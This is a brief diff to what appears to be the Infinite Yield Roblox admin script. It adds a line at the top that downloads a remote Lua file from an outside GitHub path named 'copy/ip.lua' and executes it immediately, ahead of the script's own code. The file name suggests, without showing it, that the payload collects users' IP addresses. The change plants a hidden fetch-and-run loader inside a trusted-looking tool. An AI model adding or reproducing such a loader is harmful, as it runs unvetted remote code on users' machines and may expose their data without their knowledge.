@@ -1,3 +1,7 @@
+_G.script_executed = "Infinite-Yield.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 if IY_LOADED and not _G.IY_DEBUG == true then
     -- error("Infinite Yield is already running!", 0)
     return
